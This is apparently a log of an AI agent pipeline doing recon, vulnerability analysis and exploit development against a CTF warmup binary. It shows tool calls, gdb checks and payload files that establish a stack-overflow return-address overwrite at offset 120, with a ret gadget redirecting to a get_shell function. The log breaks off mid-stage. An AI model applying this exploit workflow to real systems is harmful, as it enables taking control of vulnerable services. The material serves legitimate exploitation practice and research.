18:27:30 === Full Run: S1 → S2 → S3（所有 bug） → S4 ===

18:27:30 --- S1 Recon ---
18:27:30 === recon (bug_id=-) ===
18:27:30 [recon] → 调用 GLM...
18:27:34 [recon] ← GLM(3.5s): 调工具[checksec, elf_info, identify_libc, sections]
18:27:34 [recon] I'll start by gathering basic binary information, security protections, and runtime environment in parallel.
18:27:34 [recon]   → 工具 checksec({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:27:34 [recon]   → 工具 elf_info({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:27:34 [recon]   → 工具 identify_libc({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:27:34 [recon]   → 工具 sections({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:27:34 [recon]   ← sections(0.0s): There are 29 section headers, starting at offset 0x3ad0: ⏎  ⏎ Section Headers: ⏎   [Nr] Name              Type             Address           Offset ⏎ ...(4528 chars)
18:27:34 [recon]   ← elf_info(0.0s): /work/workspace/0008-2021-28-warmup-20260905-182730/target: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib6...(3793 chars)
18:27:34 [recon]   ← identify_libc(0.1s): 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x0000755224ca5000) ⏎ ===LIBC VERSION=== ⏎ GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.8) stable release ...(166 chars)
18:27:34 [recon]   ← checksec(0.4s): [*] '/work/workspace/0008-2021-28-warmup-20260905-182730/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:      N...(253 chars)
18:27:34 [recon] → 调用 GLM...
18:27:38 [recon] ← GLM(4.0s): 调工具[symbols, global_vars, got_plt, list_strings, disassemble]
18:27:38 [recon] Good. Now let me gather symbols, global variables, GOT/PLT, strings, and disassembly in parallel.
18:27:38 [recon]   → 工具 symbols({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "max_lines": 100})
18:27:38 [recon]   → 工具 global_vars({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "max_lines": 60})
18:27:38 [recon]   → 工具 got_plt({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:27:38 [recon]   → 工具 list_strings({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "max_lines": 100})
18:27:38 [recon]   → 工具 disassemble({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "lines": 200})
18:27:38 [recon]   ← got_plt(0.0s): [{"offset": "0000000000403ff0", "type": "R_X86_64_GLOB_DAT", "value": "__libc_start_main@GLIBC_2.2.5"}, {"offset": "0000000000403ff8", "type": "R_X86_...(1107 chars)
18:27:38 [recon]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ __isoc99_scanf ⏎ puts ⏎ stdin ⏎ printf ⏎ read ⏎ stdout ⏎ stderr ⏎ alarm ⏎ system ⏎ setvbuf ⏎ __libc_start_main ⏎ libc.so...(1343 chars)
18:27:38 [recon]   ← global_vars(0.0s):     10: 0000000000404060     8 OBJECT  GLOBAL DEFAULT   24 stdout@GLIBC_2.2.5 (2) ⏎     11: 0000000000404070     8 OBJECT  GLOBAL DEFAULT   24 stdin@G...(1209 chars)
18:27:38 [recon]   ← symbols(0.0s): 0000000000403e20 d _DYNAMIC ⏎ 0000000000404000 d _GLOBAL_OFFSET_TABLE_ ⏎ 0000000000402000 R _IO_stdin_used ⏎ 00000000004021c4 r __FRAME_END__ ⏎ 000000...(1568 chars)
18:27:38 [recon]   ← disassemble(0.0s):  ⏎ /work/workspace/0008-2021-28-warmup-20260905-182730/target:     file format elf64-x86-64 ⏎  ⏎  ⏎ Disassembly of section .init: ⏎  ⏎ 000000000040100...(6633 chars)
18:27:38 [recon] → 调用 GLM...
18:27:42 [recon] ← GLM(3.8s): 调工具[disassemble, probe_io]
18:27:42 [recon] The disassembly was truncated. Let me get the rest of main and probe the I/O behavior.
18:27:42 [recon]   → 工具 disassemble({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "function": "main", "lines": 100})
18:27:42 [recon]   → 工具 probe_io({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "steps": "[{\"recv_until\": \"echo service\", \"send\": \"AAAA\"}, {\"recv_un)
18:27:42 [recon]   ← disassemble(0.0s): 0000000000401200 <main>: ⏎   401200:	push   rbp ⏎   401201:	mov    rbp,rsp ⏎   401204:	add    rsp,0xffffffffffffff80 ⏎   401208:	mov    QWORD PTR [rbp...(1776 chars)
18:27:45 [recon]   ← probe_io(3.4s): RECV: b'Welcome to echo service' ⏎ SEND: 'AAAA' ⏎ RECV: b'.\nAAAAEnd?' ⏎ SEND: 'N' ⏎ RECV: b'' ⏎ SEND: 'BBBB' ⏎ RECV: b'[Y/N] BBBBEnd?' ⏎ SEND: 'Y' ⏎ ...(170 chars)
18:27:45 [recon] → 调用 GLM...
18:27:49 [recon] ← GLM(3.6s): 调工具[read_file, execute]
18:27:49 [recon] I now have a complete picture. Let me verify the rodata strings and the format string used in printf to confirm the format string vulnerability.
18:27:49 [recon]   → 工具 read_file({"file_path": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "limit": 1, "offset": 0})
18:27:49 [recon]   → 工具 execute({"command": "xxd -s 0x2000 -l 0x40 /work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:27:49 [recon]   ← read_file(0.0s): Error: Error reading file '/work/workspace/0008-2021-28-warmup-20260905-182730/target': 'utf-8' codec can't decode byte 0xa0 in position 24: invalid s...(159 chars)
18:27:49 [recon]   ← execute(0.0s): 00002000: 0100 0200 2f62 696e 2f73 6800 5765 6c63  ..../bin/sh.Welc ⏎ 00002010: 6f6d 6520 746f 2065 6368 6f20 7365 7276  ome to echo serv ⏎ 00002020: ...(319 chars)
18:27:49 [recon] → 调用 GLM...
18:28:34 [recon] ← GLM(45.0s): 调工具[submit_final_result]
18:28:34 [recon] I now have all the facts. The rodata confirms: `%s` at 0x402025 (printf format for user input), `End?[Y/N] ` at 0x402028, `%7s` at 0x402033 (scanf for
18:28:34 [recon] ✓ submit_final_result 收到最终报告（ReconReport 校验通过，11954 chars）
18:28:34 [recon] → 调用 GLM...
18:28:40 [recon] ← GLM(6.1s)
18:28:40 [recon] The S1 reconnaissance report has been submitted successfully. Here's a summary of the key findings:  ## S1 侦察摘要  **二进制基础信息** - ELF64 x86-64, 动态链接, 未 s
18:28:40 [stage1] 保存 → /work/workspace/0008-2021-28-warmup-20260905-182730/stage1.json
18:28:40 --- S2 Semantic ---
18:28:40 === semantic (bug_id=-) ===
18:28:40 [semantic] → 调用 GLM...
18:28:44 [semantic] ← GLM(3.2s): 调工具[disassemble, disassemble]
18:28:44 [semantic] 我将基于 S1 提供的事实对目标二进制进行语义级漏洞分析。首先反汇编 main 函数确认关键数据流和边界检查。
18:28:44 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "function": "main", "lines": 120})
18:28:44 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "function": "get_shell", "lines": 30})
18:28:44 [semantic]   ← disassemble(0.0s): 0000000000401200 <main>: ⏎   401200:	push   rbp ⏎   401201:	mov    rbp,rsp ⏎   401204:	add    rsp,0xffffffffffffff80 ⏎   401208:	mov    QWORD PTR [rbp...(1776 chars)
18:28:44 [semantic]   ← disassemble(0.0s): 0000000000401182 <get_shell>: ⏎   401182:	push   rbp ⏎   401183:	mov    rbp,rsp ⏎   401186:	lea    rdi,[rip+0xe77]        # 402004 <_IO_stdin_used+0x4...(251 chars)
18:28:44 [semantic] → 调用 GLM...
18:28:49 [semantic] ← GLM(5.7s): 调工具[read_file]
18:28:49 [semantic] 反汇编确认了关键数据流。让我验证栈帧布局和缓冲区溢出的精确偏移量。  关键事实确认： - `sub rsp, 0x80`（`add rsp, 0xffffffffffffff80`）→ 栈帧 0x80 字节 - 缓冲区在 `rbp-0x70`（距 rbp 112 字节） - `read(0, rbp
18:28:49 [semantic]   → 工具 read_file({"file_path": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "limit": 1})
18:28:49 [semantic]   ← read_file(0.0s): Error: Error reading file '/work/workspace/0008-2021-28-warmup-20260905-182730/target': 'utf-8' codec can't decode byte 0xa0 in position 24: invalid s...(159 chars)
18:28:49 [semantic] → 调用 GLM...
18:28:55 [semantic] ← GLM(5.3s): 调工具[list_strings]
18:28:55 [semantic] 让我确认 read 返回值处理逻辑的细节，以及检查是否有其他外部库调用点需要审查。  从反汇编分析 read 返回值处理： - `40123e: mov [rbp-0x4], eax` — read 返回值存入 `[rbp-0x4]` - `401241: mov eax, [rbp-0x4]` —
18:28:55 [semantic]   → 工具 list_strings({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "max_lines": 60})
18:28:55 [semantic]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ __isoc99_scanf ⏎ puts ⏎ stdin ⏎ printf ⏎ read ⏎ stdout ⏎ stderr ⏎ alarm ⏎ system ⏎ setvbuf ⏎ __libc_start_main ⏎ libc.so...(1031 chars)
18:28:55 [semantic] → 调用 GLM...
18:29:44 [semantic] ← GLM(49.6s): 调工具[submit_final_result]
18:29:44 [semantic] 字符串表确认了关键字符串。让我验证 printf 格式字符串的地址，确认 `0x402025` 处确实是 `"%s"`。  从反汇编： - `401266: lea rdi,[rip+0xdb8] # 402025` — printf 的第一个参数（格式字符串）在 0x402025 - `40126
18:29:44 [semantic] ✓ submit_final_result 收到最终报告（VulnerabilityReport 校验通过，11354 chars）
18:29:44 [semantic] → 调用 GLM...
18:29:48 [semantic] ← GLM(3.4s)
18:29:48 [semantic] S2 语义漏洞分析已完成并提交。报告包含两个漏洞：  1. **BUG-001（HIGH）**：栈缓冲区溢出 — `read(0, rbp-0x70, 0x100)` 向 112 字节的栈缓冲区写入最多 256 字节，溢出覆盖 saved rbp（偏移 112）和返回地址（偏移 120）。无 can
18:29:48 [stage2] 保存 → /work/workspace/0008-2021-28-warmup-20260905-182730/stage2.json
18:29:48 --- S3 Primitive（所有 bug） ---
18:29:48 === impact (bug_id=BUG-001) ===
18:29:48 [impact:BUG-001] → 调用 GLM...
18:29:51 [impact:BUG-001] ← GLM(3.5s): 调工具[disassemble, disassemble, checksec]
18:29:51 [impact:BUG-001] 我将分析 BUG-001（栈缓冲区溢出）并推导其原语。让我先检查二进制文件的反汇编，以确认确切的偏移量和漏洞细节。
18:29:51 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "function": "main", "lines": 120})
18:29:51 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "function": "get_shell", "lines": 30})
18:29:51 [impact:BUG-001]   → 工具 checksec({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:29:51 [impact:BUG-001]   ← disassemble(0.0s): 0000000000401182 <get_shell>: ⏎   401182:	push   rbp ⏎   401183:	mov    rbp,rsp ⏎   401186:	lea    rdi,[rip+0xe77]        # 402004 <_IO_stdin_used+0x4...(251 chars)
18:29:51 [impact:BUG-001]   ← disassemble(0.0s): 0000000000401200 <main>: ⏎   401200:	push   rbp ⏎   401201:	mov    rbp,rsp ⏎   401204:	add    rsp,0xffffffffffffff80 ⏎   401208:	mov    QWORD PTR [rbp...(1776 chars)
18:29:52 [impact:BUG-001]   ← checksec(0.4s): [*] '/work/workspace/0008-2021-28-warmup-20260905-182730/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:      N...(253 chars)
18:29:52 [impact:BUG-001] → 调用 GLM...
18:29:56 [impact:BUG-001] ← GLM(3.9s): 调工具[probe_io, find_offset]
18:29:56 [impact:BUG-001] 反汇编确认了该漏洞。现在让我验证确切的偏移量并探测 I/O 时序，以构建正确的 PoC。
18:29:56 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "steps": "[{\"recv_until\": \"echo service\", \"send\": \"AAAA\"}, {\"recv_un)
18:29:56 [impact:BUG-001]   → 工具 find_offset({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "length": 200})
18:29:59 [impact:BUG-001]   ← probe_io(3.4s): RECV: b'Welcome to echo service' ⏎ SEND: 'AAAA' ⏎ RECV: b'.\nAAAAEnd?' ⏎ SEND: 'N' ⏎ RECV: b'' ⏎ SEND: 'Y' ⏎ RECV_TAIL: b'[Y/N] '
18:30:12 [impact:BUG-001]   ← find_offset(16.5s): timeout (no crash within 15s)
18:30:12 [impact:BUG-001] → 调用 GLM...
18:30:17 [impact:BUG-001] ← GLM(5.1s): 调工具[gdb_run]
18:30:17 [impact:BUG-001] `find_offset` 没有崩溃，因为程序在循环中——它需要输入 "Y" 来退出循环并触发 `leave;ret`。让我使用 `gdb` 来确认确切的偏移量，并验证返回地址是否被覆盖。
18:30:17 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run; x/2gx $rbp; info registers rip rbp rsp", "stdi)
18:30:34 [impact:BUG-001]   ← gdb_run(16.5s): gdb timed out (15s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
18:30:34 [impact:BUG-001] → 调用 GLM...
18:30:38 [impact:BUG-001] ← GLM(4.2s): 调工具[make_payload]
18:30:38 [impact:BUG-001] `stdin` 需要正确驱动循环。`read` 调用读取 256 字节，但我的 `stdin` 包含了换行符。让我使用 `payload file` 来正确传递二进制数据。
18:30:38 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0008-2021-28-warmup-20260905-182730/payload_test.bin", "parts": [["A", 120], ["BBBBBBBB", 1], ["CCCCCCCC", 1], ["Y", 1])
18:30:38 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0008-2021-28-warmup-20260905-182730/payload_test.bin len=137 preview_hex=4141414141414141414141414141414141414141414141414141414141414...(153 chars)
18:30:38 [impact:BUG-001] → 调用 GLM...
18:30:40 [impact:BUG-001] ← GLM(2.0s): 调工具[gdb_run_crash]
18:30:40 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "payload_file": "/work/workspace/0008-2021-28-warmup-20260905-182730/payload_)
18:31:40 [impact:BUG-001]   ← gdb_run_crash(60.4s): {"raw_tail": "(gdb timed out)"}
18:31:40 [impact:BUG-001] → 调用 GLM...
18:31:47 [impact:BUG-001] ← GLM(6.9s): 调工具[make_payload]
18:31:47 [impact:BUG-001] 程序在循环，因为 `read` 会消耗 256 字节，而我的 payload 只有 137 字节。`read` 会等待更多数据。我需要精确填充到 256 字节，这样 `read` 才会返回，然后循环继续，接着 `scanf` 读取 "Y"。但问题在于：`read(0, buf, 0x100)` 会读
18:31:47 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0008-2021-28-warmup-20260905-182730/payload_test2.bin", "parts": [["A", 120], ["BBBBBBBB", 1], ["CCCCCCCC", 1], ["\n", )
18:31:47 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0008-2021-28-warmup-20260905-182730/payload_test2.bin len=139 preview_hex=414141414141414141414141414141414141414141414141414141414141...(154 chars)
18:31:47 [impact:BUG-001] → 调用 GLM...
18:31:49 [impact:BUG-001] ← GLM(2.1s): 调工具[gdb_run_crash]
18:31:49 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "payload_file": "/work/workspace/0008-2021-28-warmup-20260905-182730/payload_)
18:32:50 [impact:BUG-001]   ← gdb_run_crash(60.2s): {"raw_tail": "(gdb timed out)"}
18:32:50 [impact:BUG-001] → 调用 GLM...
18:32:53 [impact:BUG-001] ← GLM(3.9s): 调工具[run_binary]
18:32:53 [impact:BUG-001] 仍然超时。问题在于 `read(0, buf, 0x100)` 从管道读取数据——当通过管道输入时，它会读取直到 256 字节或管道为空。如果管道在 139 字节后关闭，`read` 返回 139。然后 `scanf` 尝试读取但遇到 EOF。让我更仔细地检查一下——也许问题在于 `read` 返回
18:32:53 [impact:BUG-001]   → 工具 run_binary({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "stdin": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)
18:33:04 [impact:BUG-001]   ← run_binary(11.1s): rc=-124  stdout_len=965710600  [TRUNCATED to 1500] ⏎ --- stdout (hex + ascii per line, 16B/行) --- ⏎ 0000  57 65 6c 63 6f 6d 65 20 74 6f 20 65 63 68 6f...(7291 chars)
18:33:05 [impact:BUG-001] → 调用 GLM...
18:33:27 [impact:BUG-001] ← GLM(22.3s): 调工具[write_file]
18:33:27 [impact:BUG-001] 我明白了——程序在循环，因为 `read` 会读取 256 字节，但我的输入包含 `\n`，这导致 `read` 在换行符处停止（当通过管道传输时，`read` 会读取可用数据）。`scanf` 读取 "Y"，但随后循环继续，因为 `read` 会从剩余的缓冲区数据中读取更多内容。程序会不断回显 "
18:33:27 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-001: Stack Buffer Overflow in main\nread(0, rbp-0x70, 0x100) reads 256 bytes into 112-byte bu)
18:33:27 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-001.py
18:33:27 [impact:BUG-001] → 调用 GLM...
18:33:28 [impact:BUG-001] ← GLM(1.5s): 调工具[run_script]
18:33:28 [impact:BUG-001] 现在让我运行脚本生成 payloads，然后用 gdb 验证 RIP 控制。
18:33:28 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-001.py", "timeout": 10})
18:33:28 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-001: RIP_CONTROL test === ⏎ Payload written to /work/workspace/0008-2021-28-warmup-20260905-182730/paylo...(851 chars)
18:33:28 [impact:BUG-001] → 调用 GLM...
18:33:32 [impact:BUG-001] ← GLM(4.0s): 调工具[gdb_run_crash]
18:33:32 [impact:BUG-001] 现在让我使用 gdb 验证 RIP_CONTROL 原语。我将使用 gdb 在 `ret` 指令处设置断点，并观察 RIP。
18:33:32 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "payload_file": "/work/workspace/0008-2021-28-warmup-20260905-182730/payload_)
18:34:33 [impact:BUG-001]   ← gdb_run_crash(60.3s): {"raw_tail": "(gdb timed out)"}
18:34:33 [impact:BUG-001] → 调用 GLM...
18:34:59 [impact:BUG-001] ← GLM(26.5s): 调工具[write_file]
18:34:59 [impact:BUG-001] gdb_run_crash 超时了。问题在于 `read` 会从管道读取数据，并且 payload 中包含 `\n` + `Y\n`。当通过管道传输时，`read(0, buf, 0x100)` 会读取所有可用数据（131 字节），包括 `Y\n` 部分。然后 `scanf` 会遇到 EOF，并且由
18:34:59 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-001: Stack Buffer Overflow in main\nread(0, rbp-0x70, 0x100) reads 256 bytes into 112-byte bu)
18:34:59 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-001.py
18:34:59 [impact:BUG-001] → 调用 GLM...
18:35:01 [impact:BUG-001] ← GLM(2.0s): 调工具[run_script]
18:35:01 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-001.py", "timeout": 10})
18:35:01 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-001: RIP_CONTROL test === ⏎ Payload: 128 bytes data + 128 pad + Y ⏎ Return address at offset 120, value ...(690 chars)
18:35:01 [impact:BUG-001] → 调用 GLM...
18:35:05 [impact:BUG-001] ← GLM(4.0s): 调工具[gdb_run]
18:35:05 [impact:BUG-001] 现在让我用 gdb 验证一下。关键点在于：`read(0, buf, 0x100)` 会读取最多 256 字节。当通过管道传输 258 字节时，`read` 会读取 256 字节（填满缓冲区），留下 "Y\n" 给 `scanf`。让我验证一下 RIP 控制原语。
18:35:05 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:35:05 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(626 chars)
18:35:05 [impact:BUG-001] → 调用 GLM...
18:35:16 [impact:BUG-001] ← GLM(11.0s): 调工具[gdb_run, gdb_run]
18:35:16 [impact:BUG-001] 太棒了！断点在 `ret` (0x4012ba) 处命中。我可以看到： - **RBP = 0x4141414141414141** — 等等，这不对。我预期 RBP 会被 0x41414141... 覆盖（因为填充是 'A'=0x41），而返回地址在 $rsp 处。  等等，让我重新检查一下。`l
18:35:17 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:35:17 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:35:17 [impact:BUG-001]   ← gdb_run(0.2s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(570 chars)
18:35:17 [impact:BUG-001]   ← gdb_run(0.2s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(570 chars)
18:35:17 [impact:BUG-001] → 调用 GLM...
18:35:22 [impact:BUG-001] ← GLM(5.5s): 调工具[gdb_run]
18:35:22 [impact:BUG-001] 现在我有了两个不同的值： - **Value 1**: `[rsp]` = 0x4141414141414141 (返回地址 = 0x4141414141414141) - **Value 2**: `[rsp]` = 0x4242424242424242 (返回地址 = 0x42424242424
18:35:22 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:35:22 [impact:BUG-001]   ← gdb_run(0.2s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(552 chars)
18:35:22 [impact:BUG-001] → 调用 GLM...
18:35:26 [impact:BUG-001] ← GLM(3.9s): 调工具[gdb_run]
18:35:26 [impact:BUG-001] `si` (step into) 触发了 `SIGSEGV`，因为 `ret` 试图跳转到 `0x4141414141414141`，这是一个不可执行/未映射的地址。`RIP` 试图变成 `0x4141414141414141`。让我通过检查崩溃信号来确认故障地址。
18:35:26 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:35:26 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(649 chars)
18:35:26 [impact:BUG-001] → 调用 GLM...
18:35:31 [impact:BUG-001] ← GLM(4.8s): 调工具[gdb_run]
18:35:31 [impact:BUG-001] `ret` 指令本身导致了 SIGSEGV，因为它试图跳转到 0x4141414141414141。现在让我通过重定向到 `get_shell` 来验证实际的 RIP 控制。我还要验证 STACK_CONTROL 原语（saved rbp 覆盖）。
18:35:31 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:35:31 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(626 chars)
18:35:31 [impact:BUG-001] → 调用 GLM...
18:35:37 [impact:BUG-001] ← GLM(5.3s): 调工具[search_rop_gadgets]
18:35:37 [impact:BUG-001] STACK_CONTROL 已验证： - **RBP = 0x4242424242424242** (saved rbp 被覆盖为攻击者控制的值 0x4242424242424242) - **[rsp] = 0x4141414141414141** (返回地址被覆盖为攻击者控制的值)  现在让我验
18:35:37 [impact:BUG-001]   → 工具 search_rop_gadgets({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "keyword": "ret", "max_results": 10})
18:35:37 [impact:BUG-001]   ← search_rop_gadgets(0.2s): 0x00000000004010c9 : add ah, dh ; nop dword ptr [rax + rax] ; ret ⏎ 0x00000000004010fb : add bh, bh ; loopne 0x401165 ; nop ; ret ⏎ 0x00000000004012b5...(632 chars)
18:35:37 [impact:BUG-001] → 调用 GLM...
18:35:38 [impact:BUG-001] ← GLM(1.7s): 调工具[find_ret_gadget]
18:35:38 [impact:BUG-001]   → 工具 find_ret_gadget({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target"})
18:35:39 [impact:BUG-001]   ← find_ret_gadget(0.2s): [{"addr": "0x0000000000401016", "insn": "ret"}]
18:35:39 [impact:BUG-001] → 调用 GLM...
18:35:56 [impact:BUG-001] ← GLM(17.8s): 调工具[write_file]
18:35:56 [impact:BUG-001] 在 0x401016 处有一个 `ret` gadget。现在让我构建一个 payload，将执行重定向到 `get_shell` (0x401182)，并使用 `ret` gadget 进行栈对齐。
18:35:56 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nPoC for BUG-001: Stack Buffer Overflow in main\nread(0, rbp-0x70, 0x100) reads 256 bytes into 112-byte bu)
18:35:56 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-001.py
18:35:56 [impact:BUG-001] → 调用 GLM...
18:35:59 [impact:BUG-001] ← GLM(2.1s): 调工具[run_script]
18:35:59 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0008-2021-28-warmup-20260905-182730/poc-BUG-001.py", "timeout": 10})
18:35:59 [impact:BUG-001]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ === PRIM-001: RIP_CONTROL test === ⏎ Target 1: RIP=0x4141414141414141 -> /work/workspace/0008-2021-28-warmup-2026...(717 chars)
18:35:59 [impact:BUG-001] → 调用 GLM...
18:36:03 [impact:BUG-001] ← GLM(4.8s): 调工具[gdb_run, gdb_run, gdb_run]
18:36:03 [impact:BUG-001] 现在让我用 gdb 验证所有原语。让我运行所有三个验证：
18:36:03 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:36:03 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:36:03 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:36:04 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(594 chars)
18:36:04 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(589 chars)
18:36:04 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(594 chars)
18:36:04 [impact:BUG-001] → 调用 GLM...
18:36:09 [impact:BUG-001] ← GLM(5.1s): 调工具[gdb_run]
18:36:09 [impact:BUG-001] 所有三个原语均已验证：  **PRIM-001 (RIP_CONTROL)**: - VAL1: `[rsp]` = 0x4141414141414141 (ret 将弹出到 RIP) - VAL2: `[rsp]` = 0x4242424242424242 (不同的攻击者控制值) - 两个不同的值
18:36:09 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0008-2021-28-warmup-20260905-182730/target", "commands": "b *0x4012ba; run < /work/workspace/0008-2021-28-warmup-20260905-)
18:36:09 [impact:BUG-001]   ← gdb_run(0.2s): Breakpoint 1 at 0x4012ba ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(627 chars)
18:36:09 [impact:BUG-001] → 调用 GLM...
18:36:14 [impact:BUG-001] ← GLM(5.5s): 调工具[delete, delete]
